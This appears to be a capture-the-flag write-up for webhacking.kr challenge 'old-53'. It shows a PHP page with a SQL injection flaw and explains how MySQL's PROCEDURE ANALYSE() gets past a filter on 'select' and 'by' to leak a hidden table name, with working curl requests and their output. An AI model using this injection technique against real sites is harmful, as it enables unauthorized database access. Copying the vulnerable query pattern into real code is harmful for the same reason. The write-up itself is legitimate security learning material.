# Old 53    SQLi (MySQL PROCEDURE ANALYSE)

URL: [https://webhacking.kr/challenge/web-28/?view_source=1](https://webhacking.kr/challenge/web-28/?view_source=1)

```php
<?php
$db = dbconnect();
include "./tablename.php";
if ($_GET["answer"] == $hidden_table) {
    solve(53);
}
if (preg_match("/select|by/i", $_GET["val"])) {
    exit("no hack");
}
$result = mysqli_fetch_array(
    mysqli_query($db, "select a from $hidden_table where a={$_GET["val"]}")
);
echo $result[0];
?>
```

The challenge includes a hidden table and we are supposed to find it.

We are also restricted to `select` and `by`.

We could have bruteforced the name of table, but without select that's impossible. In MySQL there's another *trick* to get table names and that it [
](https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html)

Example:
```sql
MariaDB [zap]> SELECT nick FROM names WHERE id=1 PROCEDURE ANALYSE();
+------------------------+---------------+
| zap.names.nick         | jdoe          |
+------------------------+---------------+
| Min_value              | jdoe          |
| Max_value              | jdoe          |
| Min_length             | 4             |
| Max_length             | 4             |
| Empties_or_zeros       | 0             |
| Nulls                  | 0             |
| Avg_value_or_avg_length| 4.0000        |
| Std                    | NULL          |
| Optimal_fieldtype      | ENUM('jdoe')  |
+------------------------+---------------+
```

```php
$result = mysqli_fetch_array(mysqli_query($conn, "select * from names where id=1 PROCEDURE ANALYSE()"));
echo ($result[0]);
>>> zap.names.id
```

Solve:
```powershell
➜ curl 'https://webhacking.kr/challenge/web-28/?val=1+PROCEDURE+ANALYSE()' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f'
...
webhacking.chall53_755fdeb36d873dfdeb2b34487d50a805.a<hr><a href=./?view_source=1>view-source</a>
...
➜ curl 'https://webhacking.kr/challenge/web-28/?answer=chall53_755fdeb36d873dfdeb2b34487d50a805' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f'
...
<script>alert('old-53 Pwned!');</script><hr>old-53 Pwned. You got 35point. Congratz!<hr><hr><a href=./?view_source=1>view-source</a>
```